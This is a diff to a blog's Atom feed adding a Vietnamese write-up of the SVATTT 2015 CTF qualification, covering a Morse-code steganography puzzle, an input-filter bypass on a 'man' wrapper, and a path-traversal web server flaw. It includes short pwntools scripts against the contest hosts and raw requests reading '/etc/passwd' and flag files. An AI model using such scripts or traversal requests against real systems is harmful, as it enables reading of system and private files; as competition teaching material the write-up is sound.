@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungpun.github.io/atom.xml" rel="self"/>
   <link href="http://tungpun.github.io/"/>
-  <updated>2015-10-09T08:57:23+00:00</updated>
+  <updated>2015-11-07T08:11:51+00:00</updated>
   <id>http://tungpun.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -12,6 +12,149 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups]]></title>
+    <link href="http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification/"/>
+    <updated>2015-11-07T07:17:10+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification</id>
+    <content type="html"><![CDATA[<p>Sinh viên với An toàn thông tin 2015 là một kì thi cho sinh viên được tổ chức dưới dạng các bài thi CTF kết hợp với những challenge lý thuyết - chúng ta có thể giải được bằng các kĩ thuật recon ;))</p>
+
+<p>Trong vòng loại, team mình là Animal.OhYeah (viết liền, không có dấu cách) có thứ hạng cũng khá cao #firstPlace nên hôm nay mình cũng có chút động lực để chia sẻ. Mọi lần mình viết bằng Tiếng Anh, nhưng mà mình viết chán quá đọc chả ai hiểu cả, nên lần này mình quyết định viết bằng tiếng Việt.</p>
+
+<p>Trong vòng thi vừa rồi, mình hỗ trợ các bạn khác trong nhóm giải các lây hỏi lý thuyết trắc nghiệm, hai bài exploit 100, bài hidden 100, tự mình không giải được bài nào cả.</p>
+
+<p>Hiện tại tính đến thời điểm mình viết bài thì các challenge vẫn available tại <a href="http://svattt.vnsecurity.net/">đây</a></p>
+
+<h2>Misc 100 - Quảng Ngãi :: Hidden</h2>
+
+<pre><code>Hidden
+CTF :)
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/misc100.html_659ff899f5bb31242424b127aafb9a35">Read this.</a></p>
+
+<p>Bọn mình download file kia về, copy một đoạn để tìm file gốc trên google, sau đó quan sát và phát hiện giữa hai file có một số kí tự bị thay đổi là <code>-</code>, <code>.</code> và <code></code> .</p>
+
+<blockquote><p>Morse code ?</p></blockquote>
+
+<p>Mình quyết định viết thử tool, còn bạn mình thì (trâu bò) dùng tay. Cuối cùng thì tool mình chạy sai không ra, bạn mình có kết quả trước.</p>
+
+<p>Flag: <code>SVATTTM0RS3</code></p>
+
+<h2>Exploit 100 - Hoàng Sa ::  int i = 0;</h2>
+
+<pre><code>int i = 0;
+Hint: &lt; &gt; ! @ # $ % ^ `
+nc 119.15.167.212 31338
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/exp100.c_a0a271df98aec280f58bb5cfd9991709">Source</a></p>
+
+<p>Bài này một bạn trong team mình reverse, sau đó kêu mình cứ ghi tràn 128 bytes <code>null</code> và sau đó có thể gửi dữ liệu vào được.
+Dữ liệu vào sẽ được ghép vào hàm <code>man</code> và thực thi như sau:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"man " + input</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Mình chạy sang xem qua thì thấy filter một vài ký tự :</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(strchr(buffer,'-')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,';')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'|')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'&')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,' ')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\t')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\n')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\r')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\'')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'"')!=0) return 0;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Mình nghĩ đến <code>-l</code> , nhưng không được. Bí quá guessing thử <code>/home/exp100/flag.txt</code> thì ok. Mình cũng chả biết tại sao +_+</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>try:
+</span><span class='line'>    r = remote('119.15.167.212', 31338)    
+</span><span class='line'>    print r.recvuntil(':')
+</span><span class='line'>    r.send('\x00' * 128)
+</span><span class='line'>    print r.recvuntil('&gt; ')
+</span><span class='line'>    r.send('/home/exp100/flag.txt')
+</span><span class='line'>    print r.recv(1000)
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>We have flag: <code>SVATTT_has_just_begun</code></p>
+
+<p>Hôm nay viết bài, mình mới thấy cái hint, và cũng không rõ cái hint đó có ý nghĩa gì :/</p>
+
+<h2>Exploit 100 - Hải Phòng :: Weird HTTP</h2>
+
+<pre><code>Weird HTTP
+I really love C &lt;3.
+One byte to rule them all.
+http://119.15.167.212:31335/index.html
+</code></pre>
+
+<p>Nói đến bài này, thì phải bắt đầu từ lúc đồng đội mình gửi cho mình cách <code>nc 119.15.167.212 31335</code> (IP và địa chỉ của kì thi lúc đó có thể sẽ khác), sau đó chèn thêm đoạn payload <code>GET /index.php HTTP/1.1</code> có kết quả.</p>
+
+<p>Mình thử thay bằng <code>GET //etc/passwd HTTP/1.1</code> thì có thêm vài thông tin thú vị.</p>
+
+<p>Mình thay tiếp thành <code>GET //home/exp100-python/flag HTTP/1.1</code> thì có flag :o</p>
+
+<blockquote><p>Awesome&hellip; (.______.&ldquo;)</p></blockquote>
+
+<p>Dưới đây là code pwn của mình :v (vì đây là bài pwn mà :( )</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>
+</span><span class='line'>try:    
+</span><span class='line'>    r = remote('119.15.167.212', 31335)    
+</span><span class='line'>    code = 'GET //home/exp100-python/flag' + ' HTTP/1.1'    
+</span><span class='line'>    r.send(code)
+</span><span class='line'>    print r.recv()    
+</span><span class='line'>    print r.recv()        
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Flag: <code>SVATTT_u_got_easter_egg</code></p>
+
+<blockquote><p>Have fun and Happy hacking</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DefCamp CTF 2015 - Writeup]]></title>
